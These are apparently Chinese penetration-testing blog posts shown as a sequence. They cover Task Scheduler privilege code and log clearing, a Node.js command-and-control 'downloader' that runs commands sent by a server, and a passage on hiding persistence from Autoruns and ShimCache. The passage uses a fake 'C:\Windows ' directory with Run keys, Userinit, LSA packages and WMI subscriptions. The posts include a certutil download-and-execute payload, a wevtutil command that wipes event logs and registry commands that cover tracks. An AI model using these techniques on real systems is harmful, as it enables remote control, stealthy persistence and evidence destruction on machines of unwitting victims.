<p>添加<code class="language-plaintext highlighter-rouge">LocalizedString</code>，值为<code class="language-plaintext highlighter-rouge">C:\Windows\system32\taskschd.dll</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-24/3-3.png" alt="Alt text"></p>

<p>修改官方的实例代码，添加使用COM Elevation Moniker提升权限的代码，关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  HWND    hwnd = GetConsoleWindow();
  BIND_OPTS3  bo;
  WCHAR   wszCLSID[50];
  WCHAR   wszMonikerName[300];
  StringFromGUID2( CLSID_TaskScheduler,wszCLSID,sizeof(wszCLSID)/sizeof(wszCLSID[0])); 
  hr = StringCchPrintf(wszMonikerName,sizeof(wszMonikerName)/sizeof(wszMonikerName[0]),L"Elevation:Administrator!new:%s", wszCLSID);
  memset(&amp;bo, 0, sizeof(bo));
  bo.cbStruct     = sizeof(bo);
  bo.hwnd       = hwnd;
  bo.dwClassContext = CLSCTX_LOCAL_SERVER;
  hr =  CoGetObject(wszMonikerName, &amp;bo, IID_PPV_ARGS(&amp;pService));
</code></pre></div></div>

<p>程序报错，而且没有弹出需要提升权限的UAC对话框，对其跟踪调试，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-24/3-4.png" alt="Alt text"></p>

<p>提示<code class="language-plaintext highlighter-rouge">(ERROR_INVALID_DATA) : 数据无效</code></p>

<p>通过IDA静态分析taskschd.dll，查看<code class="language-plaintext highlighter-rouge">Function</code></p>

<p>没有发现提升权限的函数(关键词Elevated、Admin)</p>

<h3 id="测试2">测试2：</h3>

<p>接下来尝试将<code class="language-plaintext highlighter-rouge">LocalizedString</code>修改为其他可用的路径</p>

<p><code class="language-plaintext highlighter-rouge">LocalizedString</code>设置为<code class="language-plaintext highlighter-rouge">@%SystemRoot%\system32\shell32.dll,-50176</code>(COM组件IFileOperation的值)</p>

<p>执行过程弹出需要提升权限的UAC对话框，接下来报错，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-24/3-5.png" alt="Alt text"></p>

<p>提示<code class="language-plaintext highlighter-rouge">REGDB_E_CLASSNOTREG Class not registered</code></p>

<p>表示这个组件不支持<code class="language-plaintext highlighter-rouge">ITaskService::Connect</code></p>

<p>和预期的一样，shell32.dll不包含函数<code class="language-plaintext highlighter-rouge">ITaskService::Connect</code></p>

<p>综上，不能简单的通过修改注册表就能使一个普通的COM组件支持权限提升</p>

<p>接下来介绍一下C++代码在实现上的细节</p>

<h4 id="1添加计划任务定时以普通权限执行程序">1、添加计划任务，定时以普通权限执行程序</h4>

<p>直接参考示例代码即可，地址如下：</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/aa383624(v=vs.85).aspx</p>

<p>修改源代码的启动时间，去掉结束时间</p>

<h4 id="2添加计划任务定时以system权限执行程序">2、添加计划任务，定时以system权限执行程序</h4>

<p>需要管理员权限</p>

<p>上面的代码直接以管理员权限运行是不可以的，这是因为并没有指定以最高权限启动</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-24/4-1.png" alt="Alt text"></p>

<p>需要修改源代码，添加指定以HIGHEST权限启动</p>

<p>关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    //  ------------------------------------------------------
    //  Create the principal for the task - these credentials
    //  are overwritten with the credentials passed to RegisterTaskDefinition
    IPrincipal *pPrincipal = NULL;
    hr = pTask-&gt;get_Principal( &amp;pPrincipal );
    if( FAILED(hr) )
    {
        printf("\nCannot get principal pointer: %x", hr );
        pRootFolder-&gt;Release();
        pTask-&gt;Release();
        CoUninitialize();
        return 1;
    }
    
    //  Set up principal logon type to interactive logon
    hr = pPrincipal-&gt;put_LogonType( TASK_LOGON_INTERACTIVE_TOKEN );
//    pPrincipal-&gt;Release();
    if( FAILED(hr) )
    {
        printf("\nCannot put principal info: %x", hr );
        pRootFolder-&gt;Release();
        pTask-&gt;Release();
        CoUninitialize();
        return 1;
    } 

  //
  hr = pPrincipal-&gt;put_RunLevel( TASK_RUNLEVEL_HIGHEST );
  pPrincipal-&gt;Release();
    if( FAILED(hr) )
    {
        printf("\nCannot put principal info: %x", hr );
        pRootFolder-&gt;Release();
        pTask-&gt;Release();
        CoUninitialize();
        return 1;
  }

</code></pre></div></div>

<p>当然，以普通权限启动会提示权限不够，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-5-24/4-2.png" alt="Alt text"></p>

<h2 id="0x05-taskscheduler日志">0x05 TaskScheduler日志</h2>
<hr>

<p>日志类别： <code class="language-plaintext highlighter-rouge">Microsoft-Windows-TaskScheduler</code></p>

<p>保存位置： <code class="language-plaintext highlighter-rouge">C:\Windows\System32\winevt\Logs</code></p>

<p>TaskScheduler日志功能默认关闭</p>

<p>开启方法：</p>

<p>注册表位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-TaskScheduler/Operational</code></p>

<p>键Enabled设为1(默认为0)</p>

<p>cmd命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-TaskScheduler/Operational" /v Enabled /t REG_DWORD /d 1 /f
</code></pre></div></div>

<p>统计日志列表，查询所有日志信息，包含时间，数目：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil gli Microsoft-Windows-TaskScheduler/Operational
</code></pre></div></div>

<p>查看日志内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil qe Microsoft-Windows-TaskScheduler/Operational
</code></pre></div></div>

<p>删除该类日志所有内容：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wevtutil cl Microsoft-Windows-TaskScheduler/Operational
</code></pre></div></div>

<p>删除单条日志：</p>

<p>该部分放在之后的文章进行详细介绍</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了计划任务的常用内容，包括多种创建计划任务的方法，不同权限创建计划任务的区别，经测试得出了一个结论，COM组件ITaskService无法提权运行</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May 24, 2018
  </div>

  
</article><article class="post">
  <h1>渗透测试中的Node.js——Downloader的实现</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Node.js是一个基于Chrome V8引擎的JavaScript运行环境,使用了一个事件驱动、非阻塞式I/O的模型，使其轻量又高效。</p>

<p>我最近在一篇文章中学到了利用Node.js绕过主动防御的技巧，于是对Node.js的语法进行了学习，开源一个Downloader的实现代码，分享脚本开发中需要注意的细节。</p>

<p>Node.js绕过主动防御的学习地址：</p>

<p>https://bbs.pediy.com/thread-249573.htm</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>基本概念</li>
  <li>利用Node.js实现的文件释放</li>
  <li>利用Node.js实现的downloader</li>
  <li>利用思路</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-基本概念">0x02 基本概念</h2>
<hr>

<h3 id="nodejs同javascript的区别">Node.js同JavaScript的区别</h3>

<p>JavaScript是一门语言</p>

<p>Node.js是一个基于Chrome V8引擎的JavaScript运行环境</p>

<p>虽然在Windows平台下，二者的脚本文件后缀名都是.js，但二者之间的区别很大，语法也不同</p>

<h3 id="nodejs的使用">Node.js的使用</h3>

<p>官方文档：</p>

<p>https://nodejs.org/api/</p>

<p>中文资料：</p>

<p>http://www.runoob.com/nodejs/nodejs-tutorial.html</p>

<p>下载地址：</p>

<p>https://nodejs.org/en/download/</p>

<p>在Windows平台下，Node.js代码保存在.js后缀名的文件中，通过node.exe加载执行</p>

<p>Node.js支持第三方包，可通过npm命令安装模块，实例如下：</p>

<p>安装web框架模块express：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install express
</code></pre></div></div>

<p>使用模块express：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var express = require('express');
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>本文涉及的代码均不使用第三方包，只使用安装包中的node.exe</p>

<h2 id="0x03-利用nodejs实现的文件释放">0x03 利用Node.js实现的文件释放</h2>
<hr>

<h3 id="实现思路">实现思路：</h3>

<p>将exe文件做base64编码存储在文件中，释放时先读取文件进行解码，最后写入文件</p>

<h4 id="1-读取文件内容做base64编码并输出到datatxt">1. 读取文件内容，做base64编码并输出到data.txt</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function base64_encode(file) {
	var fs = require('fs');
	var data = fs.readFileSync(file);
	return Buffer.from(data).toString('base64');
}
var base64str = base64_encode('test.exe');
console.log(base64str);
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">fs.readFileSync</code>表示同步读取，异步读取使用<code class="language-plaintext highlighter-rouge">fs.readFile</code></p>

<p>执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.js base64encode.js &gt;data.txt
</code></pre></div></div>

<h4 id="2-读取datatxt中保存的加密字符串base64解码并生成新的文件test2exe">2. 读取data.txt中保存的加密字符串，base64解码并生成新的文件test2.exe</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function base64_decode(base64str, file) {
	var data = Buffer.from(base64str, 'base64');
    fs.writeFileSync(file, data);
}
var fs = require('fs');
var base64str = fs.readFileSync('data.txt');
console.log(base64str.toString());
base64_decode(base64str.toString(), 'test2.exe');
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>使用代码<code class="language-plaintext highlighter-rouge">var base64str = fs.readFileSync('data.txt');</code>在读取文件后，变量<strong>base64str</strong>需要强制转换成字符串类型，即<code class="language-plaintext highlighter-rouge">base64str.toString()</code></p>

<p>为了缩小文件长度，加入压缩算法gzip</p>

<h4 id="1-读取testexe中的内容做gzip压缩后保存到文件datagz">1. 读取test.exe中的内容，做gzip压缩后保存到文件data.gz</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function gunzip(sourcePath) {
	var zlib = require('zlib');
	var fs = require('fs');
  	var unzip = zlib.createGunzip(); 
  	var rs = fs.createReadStream(sourcePath); 
  	var ws = fs.createWriteStream('test2.exe');
  	rs.pipe(unzip).pipe(ws);
}
gunzip('data.gz');
</code></pre></div></div>

<h4 id="2-读取datagz中的内容做gzip解压缩后保存到文件test2exe">2. 读取data.gz中的内容，做gzip解压缩后保存到文件test2.exe</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var zlib = require('zlib');
var fs = require('fs');
function gunzip(sourcePath) {
  var unzip = zlib.createGunzip(); 
  var rs = fs.createReadStream(sourcePath); 
  var ws = fs.createWriteStream('test2.exe');
  rs.pipe(unzip).pipe(ws);
}
gunzip('data.gz');
</code></pre></div></div>

<h2 id="0x04-利用nodejs实现的downloader">0x04 利用Node.js实现的downloader</h2>
<hr>

<h3 id="实现思路-1">实现思路：</h3>

<h4 id="1-server">1. Server</h4>

<ul>
  <li>监听指定端口，等待客户端连接，记录客户端的IP、连接时间和post数据</li>
  <li>对客户端的数据包进行筛选，对符合条件1的客户端返回控制命令，对符合条件2的客户端在当前控制台显示客户端发来的命令执行结果，否则返回404页面</li>
</ul>

<h4 id="2-client">2. Client</h4>

<ul>
  <li>连接指定服务器，发送固定格式的post数据，包括当前系统的主机名和操作系统版本</li>
  <li>接收服务器返回的控制命令，执行后将结果再次发送到服务器</li>
  <li>如果服务器未响应，等待一段时间后再次发送post请求</li>
</ul>

<p>需要考虑如下问题：</p>

<h4 id="1-通过nodejs执行cmd命令">1. 通过Node.js执行cmd命令</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function runcmd(command) {
	var childprocess = require('child_process');
	childprocess.exec(command, (err, stdout, stderr) =&gt; {
  	if (err) {
    		console.error(err);
    		return;
  	}
  	console.log(stdout);
	});
}
runcmd('whoami');
</code></pre></div></div>

<h4 id="2-http通信的实现">2. HTTP通信的实现</h4>

<p>Server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var http = require('http');
var querystring = require('querystring');
http.createServer(function (req, res) {
    	var body = '';
    	console.log('req.url:',req.url);
    	req.on('data', function (chunk) {
		body += chunk;
        	console.log("chunk:",chunk);
    	});
    	req.on('end', function () {
        	body = querystring.parse(body);  
        	console.log('body:',body);
        	res.write('Message from server');
        	res.end();
    	});
}).listen(3000,'0.0.0.0');
</code></pre></div></div>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sendHello(host1,port1){
	var http = require('http');	
	var querystring = require('querystring');
	var contents = querystring.stringify({
    		data1:'str1',
    		data2:'str2'	
	});
	var options = {
    		host: host1,
    		port: port1,
    		path: '/',
    		method:'POST',
    		headers:{
        		'Content-Type':'application/x-www-form-urlencoded',
        		'Content-Length':contents.length
    		}
	}
	console.log('post options:\n',options);
	console.log('content:',contents);

	var req = http.request(options, function(res){
    		console.log('headers:', res.headers);
    		var data1='';
    		res.on('data', function(chunk){
      			data1 += chunk;
    		});
    		res.on('end', function(){
      			console.log('result:',data1)
    		});
	});
	req.write(contents);
	req.end;
};
sendHello('127.0.0.1','3000');
</code></pre></div></div>

<p>Client向Server发送post数据，内容为<code class="language-plaintext highlighter-rouge">data1=str1&amp;data2=str2</code></p>

<p>Server收到请求后，向Client回复的内容为<code class="language-plaintext highlighter-rouge">Message from server</code></p>

<h4 id="3-sleep的实现">3. sleep的实现</h4>

<p>Node.js默认不支持sleep操作，这里可以自己实现：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sleep(milliSeconds){
	var startTime =new Date().getTime();
	while(new Date().getTime()&lt; startTime + milliSeconds);
}
var timeinterval = +'5000';
sleep(timeinterval);
</code></pre></div></div>

<p>字符串类型转换为数字，可在前面加<code class="language-plaintext highlighter-rouge">+</code></p>

<h4 id="4-client定时循环发送post请求">4. Client定时循环发送post请求</h4>

<p>这里需要考虑异步和同步的问题</p>

<p>Node.js是异步编程，但Client定时循环发送post请求需要使用同步实现，测试代码如下：</p>

<p>Server:</p>

<p>代码同上</p>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sleep(milliSeconds){
	var startTime =new Date().getTime();
	while(new Date().getTime()&lt; startTime + milliSeconds);
}
function sendHello(host1,port1){
	var http = require('http');	
	var querystring = require('querystring');
	var contents = querystring.stringify({
    		data1:'str1',
    		data2:'str2'	
	});
	var options = {
    		host: host1,
    		port: port1,
    		path: '/',
    		method:'POST',
    		headers:{
        		'Content-Type':'application/x-www-form-urlencoded',
        		'Content-Length':contents.length
    		}
	}
	console.log('post options:\n',options);
	console.log('content:',contents);

	var req = http.request(options, function(res){
    		console.log('headers:', res.headers);
    		var data1='';
    		res.on('data', function(chunk){
      			data1 += chunk;
    		});
    		res.on('end', function(){
      			console.log('result:',data1)
    		});
	});
	req.write(contents);
	req.end;
};
while (true)
{
	console.log('1');
	sleep(5000);
	sendHello('127.0.0.1','3000');
}
</code></pre></div></div>

<p><strong>期待的结果：</strong></p>

<p>Clinet每隔5秒发送一个post请求，接收结果</p>

<p><strong>实际的结果：</strong></p>

<p>每隔5秒执行一次循环，但Clinet没有发出请求</p>

<p>由于我们最初的设想是不使用npm，所以也无法使用async模块实现同步</p>

<p>最终，我通过方法嵌套解决了同步问题，示例如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sleep(milliSeconds){
	var startTime =new Date().getTime();
	while(new Date().getTime()&lt; startTime + milliSeconds);
}
function A(){
	console.log('A');
	B();	
}
function B(){
	console.log('B');
	sleep(5000);
	A();	
}
A();
</code></pre></div></div>

<h4 id="5-server显示client的ip">5. Server显示Client的IP</h4>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function getClientIp(req) {
        return req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        req.connection.socket.remoteAddress;
};
</code></pre></div></div>

<p>默认为格式为ipv6，例如：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:127.0.0.1
</code></pre></div></div>

<p>可以通过修改listen的参数指定为ipv4</p>

<p>修改前：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.listen(3000);
</code></pre></div></div>

<p>修改后：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.listen(3000,'0.0.0.0');
</code></pre></div></div>

<h4 id="6-server判断post请求不符合要求的回复404">6. Server判断post请求，不符合要求的回复404</h4>

<p>对body的内容进行判断即可</p>

<p>完整实现代码已开源，地址：</p>

<p>https://github.com/3gstudent/NodeJS-Downloader</p>

<p><strong>注：</strong></p>

<p>开源的代码仅仅是一个示例，用作演示NodeJS的功能</p>

<p>用法如下：</p>

<p>需要先获得node.exe，下载地址： https://nodejs.org/en/download/</p>

<h4 id="1-编辑文件serverjs">1. 编辑文件Server.js</h4>

<p>可编译以下内容：</p>

<ul>
  <li>向Client发送的命令：<code class="language-plaintext highlighter-rouge">var command</code></li>
  <li>监听端口： <code class="language-plaintext highlighter-rouge">.listen(80,'0.0.0.0');</code></li>
</ul>

<h4 id="2-启动server">2. 启动Server</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.exe Server.js
</code></pre></div></div>

<p>监听指定端口，等待客户端连接，记录客户端的IP、连接时间和post数据</p>

<p>对客户端的数据包进行筛选，对初次访问的客户端返回控制命令，对第二次访问的客户端在当前控制台显示客户端发来的命令执行结果，否则返回404页面</p>

<h4 id="3-编辑文件clientjs">3. 编辑文件Client.js</h4>

<p>可编译以下内容：</p>

<ul>
  <li>Server的IP：<code class="language-plaintext highlighter-rouge">var serverip</code></li>
  <li>Server的端口：<code class="language-plaintext highlighter-rouge">var serverport</code></li>
  <li>循环间隔时间：<code class="language-plaintext highlighter-rouge">var timeinterval</code></li>
</ul>

<h4 id="4-启动client">4. 启动Client</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.exe Client.js
</code></pre></div></div>

<p>Client将会连接Server，发送固定格式的post数据，包括当前系统的主机名和操作系统版本</p>

<p>接下来接收Server返回的控制命令，执行后将结果再次发送到Server</p>

<p>如果Server未响应，等待一段时间后再次发送post请求</p>

<h2 id="0x05-利用思路">0x05 利用思路</h2>
<hr>

<h4 id="1开源的代码支持多种payload">1、开源的代码支持多种payload</h4>

<p>可将payload设置为下载文件并执行，例如</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var command = 'certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\\a.exe&amp;&amp;c:\\a.exe';
</code></pre></div></div>

<p>更多下载执行的命令可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95/">《渗透技巧——从github下载文件的多种方法》</a></p>

<p><strong>注：</strong></p>

<p>发送Client退出的命令可使用：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var command = 'taskkill /f /im node.exe';
</code></pre></div></div>

<h4 id="2可被第三方可信程序加载">2、可被第三方可信程序加载</h4>

<p>参考：</p>

<p>https://bbs.pediy.com/thread-249573.htm</p>

<p><code class="language-plaintext highlighter-rouge">t.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">node.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">main.js</code></p>

<p>演示如图：</p>

<p><img src="https://github.com/3gstudent/NodeJS-Downloader/blob/master/1.png?raw=true" alt="Alt text"></p>

<h2 id="0x06-防御建议">0x06 防御建议</h2>
<hr>

<p>对t.exe的子进程(node.exe)行为进行判断，如果有可疑行为进行拦截</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文介绍了在开发Node.js代码时需要注意的细节，开源了一段Downloader的测试代码，用来演示Node.js的功能。</p>

<p>简要分析在渗透测试中的利用思路，给出防御建议。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February 28, 2019
  </div>

  
</article><article class="post">
  <h1>模拟可信目录的利用技巧扩展</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E9%80%9A%E8%BF%87%E6%A8%A1%E6%8B%9F%E5%8F%AF%E4%BF%A1%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87UAC%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">《通过模拟可信目录绕过UAC的利用分析》</a>对通过模拟可信目录绕过UAC的方法进行了分析，本文将结合自己的经验，继续介绍模拟可信目录的另外三种利用技巧，最后给出防御建议</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>利用模拟可信目录绕过Autoruns</li>
  <li>利用模拟可信目录欺骗ShimCache</li>
  <li>利用模拟可信目录伪造正常的UAC弹框</li>
</ul>

<h2 id="0x02-利用模拟可信目录绕过autoruns">0x02 利用模拟可信目录绕过Autoruns</h2>
<hr>

<p>绕过原理：</p>

<p>Autoruns默认不显示带有微软签名的文件，如果文件包含微软签名，默认不会显示在Autoruns面板</p>

<p>在Windows系统的启动位置写入模拟可信目录下的文件，由于被识别为正常带有微软签名的文件，默认将不会显示在Autoruns面板</p>

<p>经过测试，并不适用于所有的启动位置，具体测试如下：</p>

<p>创建模拟的可信目录，添加测试文件：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md "\\?\c:\windows "
md "\\?\c:\windows \system32"
copy c:\test\putty.exe "\\?\c:\windows \system32\notepad.exe"
copy c:\test\calc.dll "\\?\c:\windows \system32\atl.dll"
</code></pre></div></div>

<h3 id="1注册启动项hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun">1、注册启动项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></h3>

<p>系统启动时启动文件<code class="language-plaintext highlighter-rouge">"C:\Windows \System32\notepad.exe"</code>，添加注册表的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RunTest /t REG_SZ /d "\"c:\windows \system32\notepad.exe\""
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">"</code>在cmd下转义后用<code class="language-plaintext highlighter-rouge">\"</code>表示</p>

<p>Autoruns检测注册表项，将其识别为notepad.exe，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-1.png" alt="Alt text"></p>

<p>但在系统开机时启动的是正常notepad.exe，而不是putty.exe，失败</p>

<h3 id="2注册启动项hkey_local_machinesoftwaremicrosoftwindows-ntcurrentversionwinlogon下的userinit">2、注册启动项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>下的<code class="language-plaintext highlighter-rouge">Userinit</code></h3>

<p>查询原注册表项：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
</code></pre></div></div>

<p>默认键值内容为：<code class="language-plaintext highlighter-rouge">C:\Windows\system32\userinit.exe,</code></p>

<p>系统启动时启动文件<code class="language-plaintext highlighter-rouge">"C:\Windows \System32\notepad.exe"</code>，添加注册表的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,\"c:\windows \system32\notepad.exe\"," /f
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">"</code>在cmd下转义后用<code class="language-plaintext highlighter-rouge">\"</code>表示</p>

<p>系统开机时启动putty.exe，Autoruns检测注册表项，将其识别为notepad.exe，成功绕过</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-2.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>Autoruns默认不显示带有微软签名的文件，所以不会显示上图中的notepad.exe，上图为了演示专门设置为显示所有启动项</p>

<h3 id="3lsa-providers">3、LSA Providers</h3>

<p>注册启动项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的<code class="language-plaintext highlighter-rouge">Security Packages</code></p>

<p>添加键值<code class="language-plaintext highlighter-rouge">"c:\windows \system32\atl.dll"</code></p>

<p>Autoruns检测注册表项，将其识别为atl.dll，成功绕过</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-4.png" alt="Alt text"></p>

<h3 id="4wmi">4、WMI</h3>

<p>每隔60秒启动文件<code class="language-plaintext highlighter-rouge">"C:\Windows \System32\notepad.exe"</code>，添加wmi的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\Windows \System32\notepad.exe",CommandLineTemplate="C:\Windows \System32\notepad.exe"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""
</code></pre></div></div>

<p>执行后每隔一分钟启动putty.exe，Autoruns检测注册表项，将其识别为notepad.exe，成功绕过</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-15/2-3.png" alt="Alt text"></p>

<p>补充：</p>

<p>查看已注册wmi信息的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list
</code></pre></div></div>

<p>删除已注册wmi的命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="BotFilter82" DELETE
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="BotConsumer23" DELETE
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter="__EventFilter.Name='BotFilter82'" DELETE
</code></pre></div></div>

<h2 id="0x03-利用模拟可信目录欺骗shimcache">0x03 利用模拟可信目录欺骗ShimCache</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C%E8%AE%B0%E5%BD%95%E7%9A%84%E8%8E%B7%E5%8F%96%E4%B8%8E%E6%B8%85%E9%99%A4/">《渗透技巧——Windows系统文件执行记录的获取与清除》</a>提到：</p>

<p>ShimCache不仅会记录exe文件的执行，而且会对exe文件同级目录下的文件进行记录(如果文件没有执行，那么Executed的属性为no)</p>

<p>ShimCache只会在系统重新启动后更新(注销当前用户不会更新)</p>

<p>也就是说，想要清除本次系统从启动至关机的ShimCache记录，有两种方法：</p>

<p><strong>(1)修改注册表</strong></p>

<p>备份当前注册表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" ShimCache.reg
</code></pre></div></div>

<p>系统重启后，恢复注册表：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg import ShimCache.reg
</code></pre></div></div>

<p><strong>(2)非正常关机</strong></p>

<p>跳过写入注册表的操作，无法记录本次系统自启动至关机的记录</p>

<p><strong>(3)修改内存</strong></p>

<p>(理论上可行)</p>

<p>这里我尝试利用模拟可信目录欺骗ShimCache，迷惑性很高</p>

<p>方法如下：</p>

<h4 id="1-创建可信目录cwindows-system32">1. 创建可信目录<code class="language-plaintext highlighter-rouge">"c:\windows \system32"</code></h4>

